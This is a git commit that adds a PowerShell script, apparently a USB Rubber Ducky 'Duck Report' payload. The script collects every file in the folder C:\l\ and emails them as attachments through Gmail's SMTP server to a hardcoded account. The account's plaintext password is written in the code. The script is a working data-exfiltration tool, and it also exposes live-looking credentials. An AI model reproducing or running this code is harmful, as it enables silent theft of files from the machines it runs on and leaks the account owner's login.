b9b5a95fd291bbb4884dc0a7a28a5e17426b9849
xcybermanx <jawad@live.fr>
2019-03-30 17:34:36 +0100

    Create email.ps1

---
+++ email.ps1
@@ -0,0 +1,18 @@
+$SMTPServer = 'smtp.gmail.com'
+$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+$SMTPInfo.EnableSsl = $true
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('jawadhome2019@gmail.com', 'dvdvcdHH123+');
+$ReportEmail = New-Object System.Net.Mail.MailMessage
+$ReportEmail.From = 'jawadhome2019@gmail.com'
+$ReportEmail.To.Add('jawadhome2019@gmail.com')
+$ReportEmail.Subject = 'Duck Report'
+$ReportEmail.Body = 'Attached is your duck report.... Quack' 
+$files=Get-ChildItem "C:\l\"
+Foreach($file in $files)
+{
+Write-Host “Attaching File :- ” $file
+$attachment = New-Object System.Net.Mail.Attachment –ArgumentList C:\l\$file
+$ReportEmail.Attachments.Add($attachment)
+$SMTPInfo.Send($ReportEmail)
+}
+write-host "Mail Sent Successfully"
